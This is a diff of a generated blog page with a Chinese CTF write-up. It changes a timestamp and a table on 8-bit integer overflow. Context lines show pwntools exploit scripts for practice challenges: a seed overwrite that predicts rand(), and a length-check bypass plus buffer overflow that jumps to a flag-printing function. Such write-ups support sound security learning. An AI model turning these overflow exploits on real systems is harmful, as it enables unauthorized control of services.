@@ -110,7 +110,7 @@
 <meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425200937.png">
 <meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425200957.png">
 <meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425201254.png">
-<meta property="og:updated_time" content="2020-04-26T01:24:20.861Z">
+<meta property="og:updated_time" content="2020-04-26T13:12:25.144Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="攻防世界CTF-WriteUp">
 <meta name="twitter:description" content="pwnlevel2IDA分析很明显的溢出，而且还调用了system，看汇编。拿到call_system的地址，然后shift+f12也找到了bin_sh。脚本 12345678910111213from pwn import *r = process(&quot;level2&quot;)#r = remote(&quot;159.138.137.79&quot;, 63180)context(log_level=&quot;debug&quot;, ar">
@@ -382,7 +382,46 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">so = CDLL(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process("guess_num")</span></span><br><span class="line">r = remote(<span class="string">"159.138.137.79"</span>, <span class="number">59240</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Your name:"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">so.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    r.recvuntil(<span class="string">"number:"</span>)</span><br><span class="line">    r.sendline(str(so.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 <h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425192101.png" alt><br>main函数<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425192400.png" alt><br>跟进login函数<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425192432.png" alt><br>再跟进check_passwd函数<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425192507.png" alt><br>check_passwd对传入的字符串进行判断，只要长度在[4,8]之间就会将字符串复制到dest变量。<br>这里很明显，密码字符串的buf长度远大于dest变量，因此可以造成溢出。<br>然后考虑的就是绕过长度限制，v3是字符串长度，它是无符号8位整型，数值范围是0~255，结合题目名字可以知道当v3大于255的时候就会溢出，比如256就会溢出成0,那么[260,264]就可以溢出到[4,8]这个区间。应该不难理解。  </p>
-<p>7|6|5|4|3|2|1|0|十进制<br>:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:<br>|1|1|1|1|1|1|1|1|255<br>1|0|0|0|0|0|0|0|0|256</p>
+<table>
+<thead>
+<tr>
+<th align="center">8</th>
+<th align="center">7</th>
+<th align="center">6</th>
+<th align="center">5</th>
+<th align="center">4</th>
+<th align="center">3</th>
+<th align="center">2</th>
+<th align="center">1</th>
+<th align="center">0</th>
+<th align="center">十进制</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"></td>
+<td align="center">1</td>
+<td align="center">1</td>
+<td align="center">1</td>
+<td align="center">1</td>
+<td align="center">1</td>
+<td align="center">1</td>
+<td align="center">1</td>
+<td align="center">1</td>
+<td align="center">255</td>
+</tr>
+<tr>
+<td align="center">1</td>
+<td align="center">0</td>
+<td align="center">0</td>
+<td align="center">0</td>
+<td align="center">0</td>
+<td align="center">0</td>
+<td align="center">0</td>
+<td align="center">0</td>
+<td align="center">0</td>
+<td align="center">256</td>
+</tr>
+</tbody></table>
 <p>8位无符号整型，有效位0~7，溢出后就为0了。<br>绕过了长度问题，就要想溢出后要劫持程序流到哪。<br>仔细找找发现还漏了一个cat flag的函数。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425194729.png" alt><br>直接跳上去就可以了。<br>脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process("int_overflow")</span></span><br><span class="line">r = remote(<span class="string">"159.138.137.79"</span>, <span class="number">60855</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"i386"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"></span><br><span class="line">cat_flag_addr = <span class="number">0x0804868B</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Please input your username:"</span>, <span class="string">"sncker"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p32(cat_flag_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">260</span>, <span class="string">'a'</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
